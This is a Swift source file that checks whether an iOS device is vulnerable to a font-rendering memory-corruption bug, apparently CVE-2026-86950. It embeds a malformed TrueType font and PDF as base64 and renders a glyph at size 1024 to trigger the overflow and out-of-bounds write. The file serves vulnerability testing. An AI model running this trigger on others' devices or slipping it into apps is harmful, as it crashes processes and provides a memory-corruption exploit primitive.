//
//  GlyphCheck.swift
//  CVE-2026-86950 (Great Glyph Grift) device-side exploitability self-check
//
//  Official PoC: califio/publications MADBugs/CVE-2026-86950/trigger
//  Path: CGFont(trigger.ttf) + fontSize 1024 + CGContextShowGlyphsAtPositions
//        -> CGGlyphBitmapCreateWithPathAndDilation -> aa_cache_render
//        -> aa_double_to_fixed int overflow -> undersized bbox -> OOB write
//  Verdict: write "pre" before render, "survived" after. If a run leaves only
//           "pre", the process died mid-render = bug is live on this device.
//

import Foundation
import UIKit

enum GlyphCheck {
    static let ttfB64 = "AAEAAAAKAIAAAwAgT1MvMkE4P+kAAAEoAAAAYGNtYXAAFQCUAAABoAAAADRnbHlmEGAyeAAAAewAAADUaGVhZCz7JKwAAACsAAAANmhoZWEAZf+eAAAA5AAAACRobXR4AGQAAAAAAYgAAAAYbG9jYQExAWgAAAHUAAAAGG1heHAADAALAAABCAAAACBuYW1lAJlcyAAAAsAAAAA8cG9zdKTKmssAAAL8AAAAVQABAAAAAQAAWXF5ml8PPPUAA0AAAAAAAObh08YAAAAA5uHTxgAAAAAAIQAoAAAAAwACAAAAAAAAAAEAAABk/5wAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAEAAAALAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAkAAwBkAZAABQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAPz8/PwAAAEEAQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAwAAABQAAwABAAAAFAAEACAAAAAEAAQAAQAAAEH//wAAAEH////JAAEAAAAAAAAACgAZACIAKwA0AD0ARgBPAFgAYQBqAAEAAAAAACEAKAACAAAxMzUBAQAAAgAAAAAAIQAoAAMABQAAMTM1IwU1ISF9ACgnJgD//wAAAAAAIQAoAA4AAQAAf////wAAAAAAIQAoAA4AAgAAf////wAAAAAAIQAoAA4AAwAAf////wAAAAAAIQAoAA4ABAAAf////wAAAAAAIQAoAA4ABQAAf////wAAAAAAIQAoAA4ABgAAf////wAAAAAAIQAoAA4ABwAAf////wAAAAAAIQAoAA4ACAAAf////wAAAAAAIQAoAA4ACQAAf/8AAAAEADYAAQAAAAAAAQABAAAAAQAAAAAAAgABAAEAAwABBAkAAQACAAIAAwABBAkAAgACAARUUgBUAFIAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAABAgEDAQQBBQEGAQcBCAEJAQoAJARsZWFmAmMwAmMxAmMyAmMzAmM0AmM1AmM2AmM3AAAA"
    static let pdfB64 = "JVBERi0xLjUKJeLjz9MKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMiAwIFIgPj4KZW5kb2JqCjIgMCBvYmoKPDwgL1R5cGUgL1BhZ2VzIC9LaWRzIFszIDAgUl0gL0NvdW50IDEgPj4KZW5kb2JqCjMgMCBvYmoKPDwgL1R5cGUgL1BhZ2UgL1BhcmVudCAyIDAgUiAvTWVkaWFCb3ggWzAgMCAyMDAgMjAwXSAvUmVzb3VyY2VzIDw8IC9Gb250IDw8IC9GMSA1IDAgUiA+PiA+PiAvQ29udGVudHMgNCAwIFIgPj4KZW5kb2JqCjQgMCBvYmoKPDwgL0xlbmd0aCAzMiA+PgpzdHJlYW0KQlQgL0YxIDEwMjQgVGYgNSA1IFRkIChBKSBUaiBFVAplbmRzdHJlYW0KZW5kb2JqCjUgMCBvYmoKPDwgL1R5cGUgL0ZvbnQgL1N1YnR5cGUgL1RydWVUeXBlIC9CYXNlRm9udCAvQ1ZFRm9udCAvRmlyc3RDaGFyIDY1IC9MYXN0Q2hhciA2NSAvV2lkdGhzIFsxMDBdIC9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nIC9Gb250RGVzY3JpcHRvciA2IDAgUiA+PgplbmRvYmoKNiAwIG9iago8PCAvVHlwZSAvRm9udERlc2NyaXB0b3IgL0ZvbnROYW1lIC9DVkVGb250IC9GbGFncyA0IC9Gb250QkJveCBbMCAwIDQgNDBdIC9JdGFsaWNBbmdsZSAwIC9Bc2NlbnQgMTAwIC9EZXNjZW50IC0xMDAgL0NhcEhlaWdodCAxMDAgL1N0ZW1WIDgwIC9Gb250RmlsZTIgNyAwIFIgPj4KZW5kb2JqCjcgMCBvYmoKPDwgL0xlbmd0aCA0MjMgL0xlbmd0aDEgODUyIC9GaWx0ZXIgL0ZsYXRlRGVjb2RlID4+CnN0cmVhbQp4nIVSSy9DURD+5txb2hIsSNi1NEhIaLVlQejGVuKRkEj05rTVSKsVFrUQlpYWNkTEwtKPsBKPJX9AIhKJrRXJNXP7oG4aM5kz832TmTtn7gEB8OMABgJzCyORxMT0G0CDzCZ13iqiC8eMLxhH13O7mY5kpMT4nfFTNm2lhj9DVxyLxbNMIG2fc/zCFsrmd0pIcQQ65KM7V9AWhSnL+Elw3ioV0YoWxl7GgU0rn8bJ6i2grhlPFgvbO5f3pw+MvxgvQWZlW9naPV1rn/yAMSPN8fr8ePPbIwiZ34BCWaQuZZ/hRwj1Qg7TUsPqT97H3VJ0BA9M/C913adZ2CVYG0lA5muYlVkMtk4+yfGmU2GyCk7Ydvm072pf9qMHvRhCFFOYxRyWYWGjkpXtcM/wWIyoelPhDL6dsH2eWDC4h8GBfjidy9k2qd636xjlYgwXY7oYj4tpcjHNLsbrYnzCOHuIV25G1RfibE0Qb8z0sVes5Vgic3Eei5h3/eW/Ii9TkUEmeaiJmslLPvIjZObSVkbpUaXDSkeUHlM6qnRM6bjS41z2DZ8DbnEKZW5kc3RyZWFtCmVuZG9iagp4cmVmCjAgOAowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDAwMTUgMDAwMDAgbiAKMDAwMDAwMDA2NCAwMDAwMCBuIAowMDAwMDAwMTIxIDAwMDAwIG4gCjAwMDAwMDAyNDcgMDAwMDAgbiAKMDAwMDAwMDMyOCAwMDAwMCBuIAowMDAwMDAwNDg5IDAwMDAwIG4gCjAwMDAwMDA2NjQgMDAwMDAgbiAKdHJhaWxlcgo8PCAvU2l6ZSA4IC9Sb290IDEgMCBSID4+CnN0YXJ0eHJlZgoxMTcyCiUlRU9GCg=="

    static var stateURL: URL {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docs.appendingPathComponent("glyph_state.txt")
    }

    static func writeState(_ s: String) {
        try? s.data(using: .utf8)?.write(to: stateURL)
        BAPurge.log("(glyph) state -> \(s)")
    }

    static func lastResult() -> String {
        guard let s = try? String(contentsOf: stateURL, encoding: .utf8) else { return "never_run" }
        return s
    }

    static func trigger() {
        writeState("pre")
        BAPurge.log("(glyph) triggering CVE-2026-86950...")

        guard let fontData = Data(base64Encoded: ttfB64) else {
            BAPurge.log("(glyph) ttf decode failed"); return
        }
        guard let provider = CGDataProvider(data: fontData as CFData) else {
            BAPurge.log("(glyph) CGDataProvider failed"); return
        }
        guard let font = CGFont(provider) else {
            BAPurge.log("(glyph) CGFont rejected"); return
        }
        let ps = font.postScriptName as String? ?? "?"
        BAPurge.log("(glyph) font loaded: \(ps)")

        guard let ctx = CGContext(data: nil, width: 64, height: 64,
                                  bitsPerComponent: 8, bytesPerRow: 64,
                                  space: CGColorSpaceCreateDeviceGray(),
                                  bitmapInfo: CGImageAlphaInfo.none.rawValue) else {
            BAPurge.log("(glyph) CGContext failed"); return
        }
        ctx.setShouldSmoothFonts(false)
        ctx.setFont(font)
        ctx.setFontSize(1024)

        var glyph: CGGlyph = font.getGlyphWithGlyphName(name: "A" as CFString)
        if glyph == 0 {
            BAPurge.log("(glyph) glyph lookup failed, using index 1")
            glyph = 1
        }

        BAPurge.log("(glyph) rendering... (no survived line = TRIGGERED)")
        ctx.showGlyphs([glyph], at: [CGPoint(x: 0, y: 0)])
        let _ = ctx.makeImage()

        writeState("survived")
        BAPurge.log("(glyph) SURVIVED - not triggered on this device")
    }
}
